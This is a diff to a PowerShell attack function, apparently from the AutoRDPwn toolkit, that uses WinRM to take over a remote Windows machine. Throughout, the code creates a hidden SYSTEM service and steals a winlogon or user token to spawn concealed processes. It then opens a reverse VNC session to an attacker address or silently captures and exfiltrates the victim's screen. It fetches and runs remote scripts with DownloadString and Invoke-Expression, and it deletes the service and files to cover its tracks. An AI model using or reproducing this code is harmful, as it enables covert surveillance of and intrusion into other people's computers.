@@ -6,7 +6,7 @@ function Invoke-StealthScreen {
         $Mode = 'view',
         $AttackerIP,
         $Port = 5500,
-        $Password = 'AutoRDPwn',
+        $Password = 'AutoRDPw',
         $Path = 'C:\Windows\Temp'
     )
 
@@ -15,78 +15,7 @@ function Invoke-StealthScreen {
     $s = New-PSSession -ComputerName $Target -Credential $cred -Authentication Negotiate
     if (!$s) { Write-Host "[!] WinRM session failed" -ForegroundColor Red; return }
 
-    if ($Mode -eq 'view') {
-        if (!$AttackerIP) { Write-Host "[!] -AttackerIP required for view mode" -ForegroundColor Red; Remove-PSSession $s; return }
-
-        # Handler: UltraVNC viewer in listening mode (reuse a running instance, never double-bind)
-        $viewer = Get-Process VNCViewer -ErrorAction SilentlyContinue
-        if (!$viewer) {
-            $scriptdir = $PSScriptRoot
-            Push-Location $env:TEMP
-            try {
-                if ($scriptdir -and (Test-Path (Join-Path $scriptdir 'Invoke-VNCViewer.ps1'))) {
-                    & (Join-Path $scriptdir 'Invoke-VNCViewer.ps1')
-                } else {
-                    Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/jeko1107/AutoRDPwn/master/Resources/Scripts/Invoke-VNCViewer.ps1')
-                }
-            } finally { Pop-Location }
-            Start-Process -FilePath "$env:TEMP\VNCViewer.exe" -ArgumentList "/listen $Port /password $Password /nohotkeys /autoacceptincoming" | Out-Null
-        }
-        Write-Host "[+] Handler listening on ${AttackerIP}:$Port - spawning hidden server on target console session (logon screen safe)" -ForegroundColor Blue
-
-        # Server side pushed to target, executed as SYSTEM service -> session 1 via winlogon token theft
-        $vncps = Get-Content (Join-Path $PSScriptRoot 'Invoke-VNCServer.ps1') -Raw -ErrorAction SilentlyContinue
-        if (!$vncps) { $vncps = (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/jeko1107/AutoRDPwn/master/Resources/Scripts/Invoke-VNCServer.ps1') }
-        $vncps += "`r`nInvoke-Vnc -ConType reverse -IpAddress $AttackerIP -Port $Port -Password $Password`r`n"
-
-        $bytes = [System.Text.Encoding]::Unicode.GetBytes($vncps)
-        $vncb64 = [System.Convert]::ToBase64String($bytes)
-        $engine = @"
-`$b64 = '$vncb64'
-`$raw = [System.Convert]::FromBase64String(`$b64)
-`$txt = [System.Text.Encoding]::Unicode.GetString(`$raw)
-Set-Content -Path 'C:\Windows\Temp\vnc.ps1' -Value `$txt -Force
-Start-Process -FilePath 'powershell.exe' -ArgumentList '-nop','-w hidden','-f','C:\Windows\Temp\vnc.ps1' -WindowStyle Hidden
-"@
-
-        Set-Content -Path "$env:TEMP\engine.ps1" -Value $engine -Force
-        $engineTxt = Get-Content "$env:TEMP\engine.ps1" -Raw
-        invoke-command -session $s -scriptblock { Param($et) Set-Content -Path 'C:\Windows\Temp\ss.ps1' -Value $et -Force } -ArgumentList $engineTxt
-
-        invoke-command -session $s -scriptblock {
-            New-Service -Name 'WinSessionSvc' -BinaryPathName 'powershell.exe -nop -w hidden -f C:\Windows\Temp\ss.ps1' -StartupType Manual -ErrorAction SilentlyContinue | Out-Null
-            Start-Service -Name 'WinSessionSvc' -ErrorAction SilentlyContinue
-        }
-
-        Start-Sleep -Seconds 20
-        invoke-command -session $s -scriptblock {
-            Stop-Service -Name 'WinSessionSvc' -Force -ErrorAction SilentlyContinue
-            (Get-Service -Name 'WinSessionSvc' -ErrorAction SilentlyContinue) | ForEach-Object { sc.exe delete WinSessionSvc | Out-Null }
-            Remove-Item 'C:\Windows\Temp\ss.ps1','C:\Windows\Temp\vnc.ps1' -Force -ErrorAction SilentlyContinue
-        }
-        Write-Host "[+] Spawn attempt complete - check the viewer window" -ForegroundColor Green
-    }
-
-    if ($Mode -eq 'shot') {
-        Write-Host "[+] Capturing target console screen.." -ForegroundColor Blue
-
-        $cmd = "Add-Type -AssemblyName System.Windows.Forms,System.Drawing; " +
-               "New-Item -ItemType Directory -Path '$Path' -Force | Out-Null; " +
-               "`$b = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds; " +
-               "`$bmp = New-Object System.Drawing.Bitmap `$b.Width, `$b.Height; " +
-               "`$g = [System.Drawing.Graphics]::FromImage(`$bmp); " +
-               "`$g.CopyFromScreen(0, 0, 0, 0, `$bmp.Size); " +
-               "`$bmp.Save('$Path\shota.png'); " +
-               "`$g.Dispose(); `$bmp.Dispose()"
-        $bytes = [System.Text.Encoding]::Unicode.GetBytes($cmd)
-        $enc = [System.Convert]::ToBase64String($bytes)
-
-        $engine = @"
-`$b64 = '$enc'
-`$raw = [System.Convert]::FromBase64String(`$b64)
-`$txt = [System.Text.Encoding]::Unicode.GetString(`$raw)
-Set-Content -Path 'C:\Windows\Temp\shotc.ps1' -Value `$txt -Force
-`$def = @'
+    $cs = @'
 using System;
 using System.Runtime.InteropServices;
 public class WTS {
@@ -106,56 +35,147 @@ public class WTS {
         public IntPtr hProcess; public IntPtr hThread; public uint dwProcessId; public uint dwThreadId; }
 }
 '@
-Add-Type -TypeDefinition `$def
-`$sessId = [WTS]::WTSGetActiveConsoleSessionId()
-`$tok = [IntPtr]::Zero
-if ([WTS]::WTSQueryUserToken(`$sessId, [ref]`$tok)) {
-    [WTS]::DuplicateTokenEx(`$tok, 0x1F01FF, [IntPtr]::Zero, 2, 1, [ref]`$tok) | Out-Null
-} else {
-    `$wl = Get-Process winlogon | Where-Object { `$_.SessionId -eq `$sessId } | Select-Object -First 1
-    if (`$wl) {
-        `$h = [WTS]::OpenProcess(0x0400, `$false, `$wl.Id)
-        `$tok = [IntPtr]::Zero
-        if (`$h -ne [IntPtr]::Zero) {
-            `$r = [WTS]::OpenProcessToken(`$h, 0x1F01FF, [ref]`$tok)
+
+    if ($Mode -eq 'view') {
+        if (!$AttackerIP) { Write-Host "[!] -AttackerIP required for view mode" -ForegroundColor Red; Remove-PSSession $s; return }
+
+        $viewer = Get-Process VNCViewer -ErrorAction SilentlyContinue
+        if (!$viewer) {
+            $scriptdir = $PSScriptRoot
+            Push-Location $env:TEMP
+            try {
+                if ($scriptdir -and (Test-Path (Join-Path $scriptdir 'Invoke-VNCViewer.ps1'))) {
+                    & (Join-Path $scriptdir 'Invoke-VNCViewer.ps1')
+                } else {
+                    Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/jeko1107/AutoRDPwn/master/Resources/Scripts/Invoke-VNCViewer.ps1')
+                }
+            } finally { Pop-Location }
+            Start-Process -FilePath "$env:TEMP\VNCViewer.exe" -ArgumentList "/listen $Port /password $Password /nohotkeys /autoacceptincoming" | Out-Null
+            Start-Sleep -Seconds 3
+        }
+        Write-Host "[+] Handler on ${AttackerIP}:$Port - spawning hidden server on target console session" -ForegroundColor Blue
+
+        $vncps = Get-Content (Join-Path $PSScriptRoot 'Invoke-VNCServer.ps1') -Raw -ErrorAction SilentlyContinue
+        if (!$vncps) { $vncps = (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/jeko1107/AutoRDPwn/master/Resources/Scripts/Invoke-VNCServer.ps1') }
+        $vncps += "`r`ntry { Invoke-Vnc -ConType reverse -IpAddress $AttackerIP -Port $Port -Password $Password 2>&1 | Out-File 'C:\Windows\Temp\vnclog.txt' -Encoding utf8 } catch { `$_ | Out-File 'C:\Windows\Temp\vnclog.txt' -Encoding utf8 -Append }`r`n"
+        $vb64 = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($vncps))
+
+        $engine = "function L { Param(`$m) Add-Content -Path 'C:\Windows\Temp\sslog.txt' -Value `$m }`n" +
+"Set-Content -Path 'C:\Windows\Temp\vnc.ps1' -Value ([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('$vb64'))) -Force`n" +
+"try { Add-Type -TypeDefinition @'`n" + $cs + "`n'@`n" +
+"} catch { L (`"ADDTYPE: `" + `$_.Exception.Message) }`n" +
+"`$sessId = [WTS]::WTSGetActiveConsoleSessionId()`n" +
+"L (`"SESS: `" + `$sessId)`n" +
+"`$tok = [IntPtr]::Zero`n" +
+"if ([WTS]::WTSQueryUserToken(`$sessId, [ref]`$tok)) { L 'USERTOKEN OK' } else {`n" +
+"    L (`"USERTOKEN FAIL ERR `" + [Runtime.InteropServices.Marshal]::GetLastWin32Error())`n" +
+"    `$wl = Get-Process winlogon | Where-Object { `$_.SessionId -eq `$sessId } | Select-Object -First 1`n" +
+"    if (`$wl) { L (`"WINLOGON FOUND PID `" + `$wl.Id)`n" +
+"        `$h = [WTS]::OpenProcess(0x0400, `$false, `$wl.Id)`n" +
+"        L (`"OPENPROC ERR `" + [Runtime.InteropServices.Marshal]::GetLastWin32Error())`n" +
+"        if (`$h -ne [IntPtr]::Zero) {`n" +
+"            `$r = [WTS]::OpenProcessToken(`$h, 0x1F01FF, [ref]`$tok)`n" +
+"            L (`"OPENTOKEN `" + `$r + `" ERR `" + [Runtime.InteropServices.Marshal]::GetLastWin32Error())`n" +
+"        }`n" +
+"    } else { L 'NO WINLOGON IN SESSION' }`n" +
+"}`n" +
+"`$si = New-Object WTS+STARTUPINFO`n" +
+"`$si.cb = [System.Runtime.InteropServices.Marshal]::SizeOf(`$si)`n" +
+"`$si.lpDesktop = 'WinSta0\Default'`n" +
+"`$pi = New-Object WTS+PROCESS_INFORMATION`n" +
+"`$cmdline = 'powershell.exe -nop -w hidden -f C:\Windows\Temp\vnc.ps1'`n" +
+"`$ok = [WTS]::CreateProcessAsUserW(`$tok, `$null, `$cmdline, [IntPtr]::Zero, [IntPtr]::Zero, `$false, 0x08000000, [IntPtr]::Zero, `$null, [ref]`$si, [ref]`$pi)`n" +
+"if (!`$ok) { L (`"CREATE FAIL ERR `" + [Runtime.InteropServices.Marshal]::GetLastWin32Error()) } else { L (`"SPAWNED PID `" + `$pi.dwProcessId) }`n"
+
+        $sb = [scriptblock]::Create($engine)
+        invoke-command -session $s -scriptblock {
+            Param($et)
+            Set-Content -Path 'C:\Windows\Temp\ss.ps1' -Value $et -Force
+            New-Service -Name 'WinSessionSvc' -BinaryPathName 'powershell.exe -nop -w hidden -f C:\Windows\Temp\ss.ps1' -StartupType Manual -ErrorAction SilentlyContinue | Out-Null
+            Start-Service -Name 'WinSessionSvc' -ErrorAction SilentlyContinue
+            Start-Sleep -Seconds 22
+        } -ArgumentList $engine
+        Start-Sleep -Seconds 18
+        invoke-command -session $s -scriptblock {
+            sc.exe delete WinSessionSvc | Out-Null
+            Remove-Item 'C:\Windows\Temp\ss.ps1','C:\Windows\Temp\vnc.ps1' -Force -ErrorAction SilentlyContinue
+            'SSLOG:'
+            if (Test-Path 'C:\Windows\Temp\sslog.txt') { Get-Content 'C:\Windows\Temp\sslog.txt' } else { 'NO SSLOG' }
+            'VNCLOG:'
+            if (Test-Path 'C:\Windows\Temp\vnclog.txt') { Get-Content 'C:\Windows\Temp\vnclog.txt' } else { 'NO VNCLOG' }
         }
     }
-}
-`$si = New-Object WTS+STARTUPINFO
-`$si.cb = [System.Runtime.InteropServices.Marshal]::SizeOf(`$si)
-`$si.lpDesktop = 'WinSta0\Default'
-`$pi = New-Object WTS+PROCESS_INFORMATION
-`$cmdline = 'powershell.exe -nop -w hidden -e ' + `$b64
-`$ok = [WTS]::CreateProcessAsUserW(`$tok, `$null, `$cmdline, [IntPtr]::Zero, [IntPtr]::Zero, `$false, 0x08000000, [IntPtr]::Zero, `$null, [ref]`$si, [ref]`$pi)
-if (!`$ok) { Write-Output ('CREATE FAILED: ' + [Runtime.InteropServices.Marshal]::GetLastWin32Error()) } else { Write-Output ('SPAWNED PID ' + `$pi.dwProcessId) }
-"@
 
-        Set-Content -Path "$env:TEMP\engine.ps1" -Value $engine -Force
-        $engineTxt = Get-Content "$env:TEMP\engine.ps1" -Raw
-        $result = invoke-command -session $s -scriptblock {
-            Param($et)
+    if ($Mode -eq 'shot') {
+        Write-Host "[+] Capturing target console screen.." -ForegroundColor Blue
+
+        $cmd = "Add-Type -AssemblyName System.Windows.Forms,System.Drawing; " +
+               "New-Item -ItemType Directory -Path '$Path' -Force | Out-Null; " +
+               "`$b = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds; " +
+               "`$bmp = New-Object System.Drawing.Bitmap `$b.Width, `$b.Height; " +
+               "`$g = [System.Drawing.Graphics]::FromImage(`$bmp); " +
+               "`$g.CopyFromScreen(0, 0, 0, 0, `$bmp.Size); " +
+               "`$bmp.Save('$Path\shota.png'); " +
+               "`$g.Dispose(); `$bmp.Dispose()"
+        $bytes = [System.Text.Encoding]::Unicode.GetBytes($cmd)
+        $enc = [System.Convert]::ToBase64String($bytes)
+
+        $engine = "function L { Param(`$m) Add-Content -Path 'C:\Windows\Temp\sslog.txt' -Value `$m }`n" +
+"Set-Content -Path 'C:\Windows\Temp\shotc.ps1' -Value ([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('$enc'))) -Force`n" +
+"try { Add-Type -TypeDefinition @'`n" + $cs + "`n'@`n" +
+"} catch { L (`"ADDTYPE: `" + `$_.Exception.Message) }`n" +
+"`$sessId = [WTS]::WTSGetActiveConsoleSessionId()`n" +
+"L (`"SESS: `" + `$sessId)`n" +
+"`$tok = [IntPtr]::Zero`n" +
+"if ([WTS]::WTSQueryUserToken(`$sessId, [ref]`$tok)) { L 'USERTOKEN OK' } else {`n" +
+"    L (`"USERTOKEN FAIL ERR `" + [Runtime.InteropServices.Marshal]::GetLastWin32Error())`n" +
+"    `$wl = Get-Process winlogon | Where-Object { `$_.SessionId -eq `$sessId } | Select-Object -First 1`n" +
+"    if (`$wl) { L (`"WINLOGON FOUND PID `" + `$wl.Id)`n" +
+"        `$h = [WTS]::OpenProcess(0x0400, `$false, `$wl.Id)`n" +
+"        L (`"OPENPROC ERR `" + [Runtime.InteropServices.Marshal]::GetLastWin32Error())`n" +
+"        if (`$h -ne [IntPtr]::Zero) {`n" +
+"            `$r = [WTS]::OpenProcessToken(`$h, 0x1F01FF, [ref]`$tok)`n" +
+"            L (`"OPENTOKEN `" + `$r + `" ERR `" + [Runtime.InteropServices.Marshal]::GetLastWin32Error())`n" +
+"        }`n" +
+"    } else { L 'NO WINLOGON IN SESSION' }`n" +
+"}`n" +
+"`$si = New-Object WTS+STARTUPINFO`n" +
+"`$si.cb = [System.Runtime.InteropServices.Marshal]::SizeOf(`$si)`n" +
+"`$si.lpDesktop = 'WinSta0\Default'`n" +
+"`$pi = New-Object WTS+PROCESS_INFORMATION`n" +
+"`$cmdline = 'powershell.exe -nop -w hidden -e ' + '$enc'`n" +
+"`$ok = [WTS]::CreateProcessAsUserW(`$tok, `$null, `$cmdline, [IntPtr]::Zero, [IntPtr]::Zero, `$false, 0x08000000, [IntPtr]::Zero, `$null, [ref]`$si, [ref]`$pi)`n" +
+"if (!`$ok) { L (`"CREATE FAIL ERR `" + [Runtime.InteropServices.Marshal]::GetLastWin32Error()) } else { L (`"SPAWNED PID `" + `$pi.dwProcessId) }`n" +
+"Start-Sleep -Seconds 12"
+
+        $sb = [scriptblock]::Create($engine)
+        invoke-command -session $s -scriptblock {
+            Param($et, $engineSb)
+            Remove-Item 'C:\Windows\Temp\sslog.txt' -Force -ErrorAction SilentlyContinue
             Set-Content -Path 'C:\Windows\Temp\ss.ps1' -Value $et -Force
             New-Service -Name 'WinShotSvc' -BinaryPathName 'powershell.exe -nop -w hidden -f C:\Windows\Temp\ss.ps1' -StartupType Manual -ErrorAction SilentlyContinue | Out-Null
             Start-Service -Name 'WinShotSvc' -ErrorAction SilentlyContinue
-            Start-Sleep -Seconds 18
+            Start-Sleep -Seconds 26
             Stop-Service -Name 'WinShotSvc' -Force -ErrorAction SilentlyContinue
             sc.exe delete WinShotSvc | Out-Null
-            if (Test-Path 'C:\Windows\Temp\shota.png') { (Get-Item 'C:\Windows\Temp\shota.png').Length } else { 'NOFILE' }
-        } -ArgumentList $engineTxt
-        Write-Host "[i] Service result: $result"
+            'LOG:'
+            if (Test-Path 'C:\Windows\Temp\sslog.txt') { Get-Content 'C:\Windows\Temp\sslog.txt' } else { 'NO SSLOG' }
+            'FILE:'
+            if (Test-Path 'C:\Windows\Temp\shota.png') { "SHOTFILE $((Get-Item 'C:\Windows\Temp\shota.png').Length) bytes" } else { 'NOFILE' }
+        } -ArgumentList $engine, $sb
+        Write-Host "[i] result above"
 
-        if ($result -and $result -ne 'NOFILE') {
-            invoke-command -session $s -scriptblock {
-                $ms = New-Object IO.MemoryStream
-                $ms.Write([IO.File]::ReadAllBytes('C:\Windows\Temp\shota.png'), 0, (Get-Item 'C:\Windows\Temp\shota.png').Length)
-                [Convert]::ToBase64String($ms.ToArray())
-            } | ForEach-Object {
-                [IO.File]::WriteAllBytes("$env:TEMP\stealthshot.png", [Convert]::FromBase64String($_))
+        $res = invoke-command -session $s -scriptblock {
+            if (Test-Path 'C:\Windows\Temp\shota.png') {
+                [Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\Windows\Temp\shota.png'))
             }
+        }
+        if ($res) {
+            [IO.File]::WriteAllBytes("$env:TEMP\stealthshot.png", [Convert]::FromBase64String($res))
             Write-Host "[+] Screen captured: $env:TEMP\stealthshot.png" -ForegroundColor Green
             Invoke-Item "$env:TEMP\stealthshot.png"
         } else {
-            Write-Host "[!] No screenshot arrived - check the target session state" -ForegroundColor Red
+            Write-Host "[!] No screenshot arrived" -ForegroundColor Red
         }
     }
 
